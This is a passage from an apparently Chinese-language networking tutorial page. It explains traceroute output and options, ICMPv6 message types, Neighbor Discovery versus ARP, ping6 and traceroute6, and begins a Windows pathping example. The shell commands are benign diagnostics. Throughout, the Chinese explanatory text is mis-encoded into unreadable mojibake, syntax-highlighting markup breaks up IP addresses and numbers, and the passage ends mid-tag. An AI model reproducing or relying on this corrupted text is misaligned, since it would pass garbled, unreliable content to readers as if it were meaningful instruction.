å¯èƒ½æ˜¯è´Ÿè½½å‡è¡¡</span><br><span class="hljs-emphasis">   - æˆ–ECMPï¼ˆç­‰ä»·å¤šè·¯å¾„ï¼‰</span><br></code></pre></td></tr></table></figure><h3 id="3-4-tracerouteè¾“å‡ºè§£æ"><a href="#3-4-tracerouteè¾“å‡ºè§£æ" class="headerlink" title="3.4 tracerouteè¾“å‡ºè§£æ"></a>3.4 tracerouteè¾“å‡ºè§£æ</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">ç¤ºä¾‹è¾“å‡ºï¼š<br><br>$ traceroute google.com<br>traceroute to google.com (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>), <span class="hljs-number">30</span> hops max, <span class="hljs-number">60</span> byte packets<br> <span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>)  <span class="hljs-number">1.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">156</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">2</span>  <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">5.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">3</span>  <span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">10.456</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">10</span>.<span class="hljs-number">389</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">10</span>.<span class="hljs-number">234</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">4</span>  <span class="hljs-number">61.152</span>.<span class="hljs-number">54.125</span> (<span class="hljs-number">61.152</span>.<span class="hljs-number">54.125</span>)  <span class="hljs-number">15.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">5</span>  <span class="hljs-number">61.152</span>.<span class="hljs-number">25.90</span> (<span class="hljs-number">61.152</span>.<span class="hljs-number">25.90</span>)  <span class="hljs-number">20.456</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">20</span>.<span class="hljs-number">389</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">20</span>.<span class="hljs-number">234</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">6</span>  <span class="hljs-number">202.97</span>.<span class="hljs-number">33.106</span> (<span class="hljs-number">202.97</span>.<span class="hljs-number">33.106</span>)  <span class="hljs-number">25.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">25</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">25</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">7</span>  * * *<br> <span class="hljs-number">8</span>  <span class="hljs-number">108.170</span>.<span class="hljs-number">252.1</span> (<span class="hljs-number">108.170</span>.<span class="hljs-number">252.1</span>)  <span class="hljs-number">45.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">9</span>  <span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span> (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>)  <span class="hljs-number">50.123</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">50</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">50</span>.<span class="hljs-number">045</span> <span class="hljs-keyword">ms</span><br><br><span class="hljs-title">è§£æï¼š</span><br><span class="hljs-title"></span><br><span class="hljs-title">ç¬¬ä¸€è¡Œï¼š</span><br><span class="hljs-title">traceroute</span> to google.com (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>), <span class="hljs-number">30</span> hops max, <span class="hljs-number">60</span> byte packets<br>- ç›®æ ‡ï¼šgoogle.com (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>)<br>- æœ€å¤§è·³æ•°ï¼š<span class="hljs-number">30</span><br>- åŒ…å¤§å°ï¼š<span class="hljs-number">60</span>å­—èŠ‚<br><br>æ¯ä¸€è·³ï¼š<br><span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>)  <span class="hljs-number">1.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">156</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">â”‚        â”‚           â”‚          â”‚          â”‚          â”‚</span><br><span class="hljs-title">â”‚        â”‚           â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€ 3</span>æ¬¡å¾€è¿”æ—¶é—´<br>â”‚        â”‚           â””â”€ ä¸»æœºåï¼ˆå¦‚æœèƒ½è§£æï¼‰<br>â”‚        â””â”€ IPåœ°å€<br>â””â”€ è·³æ•°<br><br>ç‰¹æ®Šæƒ…å†µï¼š<br><br><span class="hljs-number">1</span>. * * *<br>   <span class="hljs-number">7</span>  * * *<br>   â†’ è¯¥è·³è·¯ç”±å™¨ä¸å“åº”æˆ–è¢«è¿‡æ»¤<br><br><span class="hljs-number">2</span>. è¯·æ±‚è¶…æ—¶åè·³è¿‡<br>   <span class="hljs-number">7</span>  * * *<br>   <span class="hljs-number">8</span>  <span class="hljs-number">108.170</span>.<span class="hljs-number">252.1</span>  <span class="hljs-number">45.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">â†’ ç¬¬7</span>è·³æ— å“åº”ï¼Œä½†ç¬¬<span class="hljs-number">8</span>è·³å¯è¾¾ï¼ˆä¸­é—´è·¯ç”±å™¨è¢«é…ç½®ä¸ºä¸å“åº”ï¼‰<br><br><span class="hljs-number">3</span>. å»¶è¿Ÿçªç„¶å¢åŠ <br>   <span class="hljs-number">5</span>  ...  <span class="hljs-number">20.234</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">6</span>  ...  <span class="hljs-number">25.178</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">7</span>  ...  <span class="hljs-number">80.456</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">â† çªç„¶å¢åŠ </span><br><span class="hljs-title">   â†’ å¯èƒ½çš„åŸå› ï¼š</span><br><span class="hljs-title">     - è·¨è¶Šé•¿è·ç¦»é“¾è·¯</span><br><span class="hljs-title">     - å«æ˜Ÿé“¾è·¯</span><br><span class="hljs-title">     - æ‹¥å¡</span><br><span class="hljs-title">     - è·¯ç”±å™¨è´Ÿè½½é«˜</span><br><span class="hljs-title"></span><br><span class="hljs-title">4</span>. å¤šä¸ªIPåœ°å€<br>   <span class="hljs-number">3</span>  <span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">10.456</span> <span class="hljs-keyword">ms</span><br>      <span class="hljs-title">172</span>.<span class="hljs-number">16.0</span>.<span class="hljs-number">2</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.2</span>)  <span class="hljs-number">10.389</span> <span class="hljs-keyword">ms</span><br>      <span class="hljs-title">172</span>.<span class="hljs-number">16.0</span>.<span class="hljs-number">1</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">10.234</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">â†’ è´Ÿè½½å‡è¡¡æˆ–ECMP</span><br></code></pre></td></tr></table></figure><h3 id="3-5-tracerouteå¸¸ç”¨é€‰é¡¹"><a href="#3-5-tracerouteå¸¸ç”¨é€‰é¡¹" class="headerlink" title="3.5 tracerouteå¸¸ç”¨é€‰é¡¹"></a>3.5 tracerouteå¸¸ç”¨é€‰é¡¹</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å¸¸ç”¨å‚æ•°ï¼š<br><br>-m max_ttl<br>è®¾ç½®æœ€å¤§TTLï¼ˆé»˜è®¤<span class="hljs-number">30</span>ï¼‰<br>traceroute -m <span class="hljs-number">20</span> google<span class="hljs-selector-class">.com</span><br><br>-<span class="hljs-selector-tag">q</span> nqueries<br>æ¯è·³å‘é€çš„åŒ…æ•°é‡ï¼ˆé»˜è®¤<span class="hljs-number">3</span>ï¼‰<br>traceroute -<span class="hljs-selector-tag">q</span> <span class="hljs-number">5</span> google<span class="hljs-selector-class">.com</span><br><br>-w waittime<br>ç­‰å¾…å“åº”çš„è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œé»˜è®¤<span class="hljs-number">5</span>ï¼‰<br>traceroute -w <span class="hljs-number">2</span> google<span class="hljs-selector-class">.com</span><br><br>-I<br>ä½¿ç”¨ICMPå›æ˜¾ä»£æ›¿UDPï¼ˆéœ€è¦rootï¼‰<br>sudo traceroute -I google<span class="hljs-selector-class">.com</span><br><br>-T<br>ä½¿ç”¨TCP SYNä»£æ›¿UDPï¼ˆéœ€è¦rootï¼‰<br>sudo traceroute -T google<span class="hljs-selector-class">.com</span><br><br>-<span class="hljs-selector-tag">p</span> port<br>è®¾ç½®èµ·å§‹ç«¯å£å·ï¼ˆé»˜è®¤<span class="hljs-number">33434</span>ï¼‰<br>traceroute -<span class="hljs-selector-tag">p</span> <span class="hljs-number">40000</span> google<span class="hljs-selector-class">.com</span><br><br>-n<br>ä¸è§£æä¸»æœºåï¼Œåªæ˜¾ç¤ºIP<br>traceroute -n google<span class="hljs-selector-class">.com</span><br><br>-A<br>å¯ç”¨ASå·æŸ¥æ‰¾<br>traceroute -A google<span class="hljs-selector-class">.com</span><br><br>å®ç”¨æŠ€å·§ï¼š<br><br><span class="hljs-number">1</span>. å¿«é€Ÿtracerouteï¼š<br>   traceroute -<span class="hljs-selector-tag">q</span> <span class="hljs-number">1</span> -w <span class="hljs-number">1</span> target<br>   æ¯è·³åªå‘<span class="hljs-number">1</span>ä¸ªåŒ…ï¼Œ<span class="hljs-number">1</span>ç§’è¶…æ—¶<br><br><span class="hljs-number">2</span>. ICMPæ–¹å¼ï¼ˆæ›´å®¹æ˜“é€šè¿‡é˜²ç«å¢™ï¼‰ï¼š<br>   sudo traceroute -I target<br><br><span class="hljs-number">3</span>. TCPæ–¹å¼ï¼ˆæµ‹è¯•åˆ°ç‰¹å®šç«¯å£ï¼‰ï¼š<br>   sudo traceroute -T -<span class="hljs-selector-tag">p</span> <span class="hljs-number">80</span> target<br>   è¿½è¸ªåˆ°<span class="hljs-number">80</span>ç«¯å£çš„è·¯å¾„<br><br><span class="hljs-number">4</span>. ä¸è§£æåŸŸåï¼ˆæ›´å¿«ï¼‰ï¼š<br>   traceroute -n target<br></code></pre></td></tr></table></figure><hr><h2 id="4-ICMPv6"><a href="#4-ICMPv6" class="headerlink" title="4. ICMPv6"></a>4. ICMPv6</h2><h3 id="4-1-ICMPv6æ¦‚è¿°"><a href="#4-1-ICMPv6æ¦‚è¿°" class="headerlink" title="4.1 ICMPv6æ¦‚è¿°"></a>4.1 ICMPv6æ¦‚è¿°</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs smali">ICMPv6 = ICMP for IPv6<br><br>ç›¸æ¯”ICMPv4çš„å˜åŒ–ï¼š<br>âœ… åŠŸèƒ½æ›´å¼ºå¤§<br>âœ… æ•´åˆäº†æ›´å¤šåŠŸèƒ½<br>âœ… å¿…é¡»å®ç°ï¼ˆä¸æ˜¯å¯é€‰ï¼‰<br>âœ… ç®€åŒ–äº†ç±»å‹ç¼–ç <br><br>ICMPv6æ‰¿æ‹…çš„èŒè´£ï¼š<br>1. é”™è¯¯æŠ¥å‘Šï¼ˆå’ŒICMPv4ç±»ä¼¼ï¼‰<br>2. è¯Šæ–­åŠŸèƒ½ï¼ˆpingã€tracerouteï¼‰<br>3. é‚»å±…å‘ç°ï¼ˆNDPï¼‰â† æ–°å¢ï¼<br>4. å¤šæ’­ç»„ç®¡ç†ï¼ˆMLDï¼‰â† æ–°å¢ï¼<br><br>åè®®å·ï¼š58ï¼ˆIPv6 Next Headerï¼‰<br></code></pre></td></tr></table></figure><h3 id="4-2-ICMPv6æŠ¥æ–‡ç±»å‹"><a href="#4-2-ICMPv6æŠ¥æ–‡ç±»å‹" class="headerlink" title="4.2 ICMPv6æŠ¥æ–‡ç±»å‹"></a>4.2 ICMPv6æŠ¥æ–‡ç±»å‹</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ada">ç±»å‹åˆ†ç±»ï¼š<br><br><span class="hljs-number">1</span>. é”™è¯¯æ¶ˆæ¯ï¼ˆ<span class="hljs-number">0</span>-<span class="hljs-number">127</span>ï¼‰ï¼š<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">1: </span>ç›®æ ‡ä¸å¯è¾¾<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">2: </span>åŒ…å¤ªå¤§<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">3: </span>è¶…æ—¶<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">4: </span>å‚æ•°é—®é¢˜<br><br><span class="hljs-number">2</span>. ä¿¡æ¯æ¶ˆæ¯ï¼ˆ<span class="hljs-number">128</span>-<span class="hljs-number">255</span>ï¼‰ï¼š<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">128: </span>å›æ˜¾è¯·æ±‚<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">129: </span>å›æ˜¾åº”ç­”<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">133: </span>è·¯ç”±å™¨è¯·æ±‚ï¼ˆRSï¼‰<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">134: </span>è·¯ç”±å™¨é€šå‘Šï¼ˆRAï¼‰<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">135: </span>é‚»å±…è¯·æ±‚ï¼ˆNSï¼‰<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">136: </span>é‚»å±…é€šå‘Šï¼ˆNAï¼‰<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">137: </span>é‡å®šå‘<br><br>é‚»å±…å‘ç°åè®®ï¼ˆNDPï¼‰ï¼š<br>- å–ä»£äº†IPv4çš„ARP<br>- ä½¿ç”¨ICMPv6æ¶ˆæ¯<br>- ç±»å‹<span class="hljs-number">133</span>-<span class="hljs-number">137</span><br><br>å¤šæ’­ä¾¦å¬å‘ç°ï¼ˆMLDï¼‰ï¼š<br>- å–ä»£äº†IPv4çš„IGMP<br>- ç®¡ç†å¤šæ’­ç»„æˆå‘˜<br></code></pre></td></tr></table></figure><h3 id="4-3-é‚»å±…å‘ç°åè®®ï¼ˆNDPï¼‰"><a href="#4-3-é‚»å±…å‘ç°åè®®ï¼ˆNDPï¼‰" class="headerlink" title="4.3 é‚»å±…å‘ç°åè®®ï¼ˆNDPï¼‰"></a>4.3 é‚»å±…å‘ç°åè®®ï¼ˆNDPï¼‰</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown">NDPåŠŸèƒ½ï¼š<br><span class="hljs-bullet">1.</span> åœ°å€è§£æï¼ˆæ›¿ä»£ARPï¼‰<br><span class="hljs-bullet">2.</span> è·¯ç”±å™¨å‘ç°<br><span class="hljs-bullet">3.</span> å‰ç¼€å‘ç°<br><span class="hljs-bullet">4.</span> é‚»å±…ä¸å¯è¾¾æ£€æµ‹<br><span class="hljs-bullet">5.</span> é‡å¤åœ°å€æ£€æµ‹ï¼ˆDADï¼‰<br><span class="hljs-bullet">6.</span> é‡å®šå‘<br><br>å·¥ä½œæµç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> é‚»å±…è¯·æ±‚ï¼ˆNSï¼‰+ é‚»å±…é€šå‘Šï¼ˆNAï¼‰ï¼š<br>   ä¸»æœºAæƒ³å‘é€ç»™ä¸»æœºB<br>   â†’ å‘é€NSï¼šè°æ˜¯2001:db8::2ï¼Ÿ<br>   â†’ ä¸»æœºBå›å¤NAï¼šæˆ‘æ˜¯ï¼Œæˆ‘çš„MACæ˜¯xx:xx:xx:xx:xx:xx<br><br><span class="hljs-bullet">2.</span> è·¯ç”±å™¨è¯·æ±‚ï¼ˆRSï¼‰+ è·¯ç”±å™¨é€šå‘Šï¼ˆRAï¼‰ï¼š<br>   æ–°ä¸»æœºä¸Šçº¿<br>   â†’ å‘é€RSï¼šæœ‰è·¯ç”±å™¨å—ï¼Ÿ<br>   â†’ è·¯ç”±å™¨å›å¤RAï¼šæˆ‘åœ¨è¿™ï¼Œå‰ç¼€æ˜¯2001:db8::/64<br><br><span class="hljs-bullet">3.</span> é‡å¤åœ°å€æ£€æµ‹ï¼ˆDADï¼‰ï¼š<br>   ä¸»æœºé…ç½®åœ°å€å‰<br>   â†’ å‘é€NSï¼ˆç›®æ ‡æ˜¯è‡ªå·±çš„åœ°å€ï¼‰<br>   â†’ å¦‚æœæ”¶åˆ°NAï¼šåœ°å€å†²çªï¼<br>   â†’ å¦‚æœæ— å“åº”ï¼šåœ°å€å¯ç”¨<br><br>å¯¹æ¯”ARPï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ç‰¹æ€§     â”‚     ARP      â”‚     NDP      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ åè®®        â”‚  ç‹¬ç«‹åè®®    â”‚  ICMPv6      â”‚<br>â”‚ å¹¿æ’­        â”‚    ä½¿ç”¨      â”‚   ä¸ä½¿ç”¨     â”‚<br>â”‚ å¤šæ’­        â”‚   ä¸æ”¯æŒ     â”‚    ä½¿ç”¨      â”‚<br>â”‚ é¢å¤–åŠŸèƒ½    â”‚    æ—         â”‚  è·¯ç”±å‘ç°ç­‰  â”‚<br>â”‚ å®‰å…¨        â”‚    è¾ƒå·®      â”‚   å¯åŠ å¯†     â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="4-4-ping6-å’Œ-traceroute6"><a href="#4-4-ping6-å’Œ-traceroute6" class="headerlink" title="4.4 ping6 å’Œ traceroute6"></a>4.4 ping6 å’Œ traceroute6</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">IPv6ç‰ˆæœ¬çš„è¯Šæ–­å·¥å…·ï¼š<br><br>ping6ï¼š<br>- ç±»ä¼¼pingï¼Œç”¨äºIPv6<br>- ä½¿ç”¨ICMPv6 <span class="hljs-keyword">Type</span> <span class="hljs-number">128</span>/<span class="hljs-number">129</span><br>- å‘½ä»¤ï¼šping6 ipv6.google.com<br><br>ç¤ºä¾‹ï¼š<br>$ ping6 google.com<br>PING google.com(lax30s04-<span class="hljs-keyword">in</span>-x0e.<span class="hljs-number">1</span>e100.net (<span class="hljs-number">2607</span>:f8b0:<span class="hljs-number">4005</span>:<span class="hljs-number">80</span>a::<span class="hljs-number">200</span>e)) <span class="hljs-number">56</span> data bytes<br><span class="hljs-number">64</span> bytes from lax30s04-<span class="hljs-keyword">in</span>-x0e.<span class="hljs-number">1</span>e100.net (<span class="hljs-number">2607</span>:f8b0:<span class="hljs-number">4005</span>:<span class="hljs-number">80</span>a::<span class="hljs-number">200</span>e): <span class="hljs-attr">icmp_seq=</span><span class="hljs-number">1</span> <span class="hljs-attr">ttl=</span><span class="hljs-number">55</span> <span class="hljs-attr">time=</span><span class="hljs-number">15.2</span> <span class="hljs-keyword">ms</span><br><br><span class="hljs-title">traceroute6</span>ï¼š<br>- ç±»ä¼¼tracerouteï¼Œç”¨äºIPv6<br>- å‘½ä»¤ï¼štraceroute6 ipv6.google.com<br><br>ç¤ºä¾‹ï¼š<br>$ traceroute6 google.com<br>traceroute to google.com (<span class="hljs-number">2607</span>:f8b0:<span class="hljs-number">4005</span>:<span class="hljs-number">80</span>a::<span class="hljs-number">200</span>e), <span class="hljs-number">30</span> hops max, <span class="hljs-number">80</span> byte packets<br> <span class="hljs-number">1</span>  fe80::<span class="hljs-number">1</span>  <span class="hljs-number">1.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">156</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">2</span>  <span class="hljs-number">2001</span>:db8::<span class="hljs-number">1</span>  <span class="hljs-number">5.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">...</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-å…¶ä»–ç½‘ç»œè¯Šæ–­å·¥å…·"><a href="#5-å…¶ä»–ç½‘ç»œè¯Šæ–­å·¥å…·" class="headerlink" title="5. å…¶ä»–ç½‘ç»œè¯Šæ–­å·¥å…·"></a>5. å…¶ä»–ç½‘ç»œè¯Šæ–­å·¥å…·</h2><h3 id="5-1-pathping-mtr"><a href="#5-1-pathping-mtr" class="headerlink" title="5.1 pathping &#x2F; mtr"></a>5.1 pathping &#x2F; mtr</h3><p><strong>Windows pathping</strong>ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tap">pathping = ping + traceroute<br><br>åŠŸèƒ½ï¼š<br>- ç»“åˆpingå’Œtraceroute<br>- æ˜¾ç¤ºæ¯ä¸€è·³çš„ä¸¢åŒ…ç‡<br>- é•¿æ—¶é—´ç»Ÿè®¡ï¼ˆé»˜è®¤25ç§’æ¯è·³ï¼‰<br><br>ä½¿ç”¨ï¼š<br>C:\&gt; pathping google.com<br><br>è¾“å‡ºï¼š<br>Tracing route to google.com [142.250.185.14]<br>over a maximum of<span class="hljs-number"> 30 </span>hops:<br> <span class="hljs-number"> 0 </span> MYCOMPUTER [192.168.1.100]<br> <span class="hljs-number"> 1 </span> 192.168.1.1<br> <span class="hljs-number"> 2 </span> 10.0.0.1<br>  ...<br><br>Computing statistics for<span class="hljs-number"> 50 </span>seconds...<br>            Source to Here   This Node/Link<br>Hop  RTT    Lost/Sent = Pct  Lost/Sent = Pct  Address<br> <span class="hljs-number"> 0 </span>                                          MYCOMPUTER [192.168.1.100]<br>                                0/<span class="hljs-number"> 100 </span>=  0%   |<br> <span class="hljs-number"> 1 </span>   1ms     0/<span class="hljs-number"> 100 </span>=  0%     0/<span class="hljs-number"> 100 </span>=  0%  192.168.1.1<br>                                0/<span class="hljs-number"> 100 </span>=  0%   |<br> <span class="hljs-number"> 2 </span>   5ms     2/<span class="hljs-number"> 100 </span>=  2%     2/<span class="hljs-number"> 100 </span>=  2%  10.0.0.1<br>                                5/<span class="hljs-number"> 100 </span>=  5%   |<br> <span class="hljs-number"> 3 </span>  15ms     5/<span class="hljs-number"> 100 </span>=  5%     3/<span 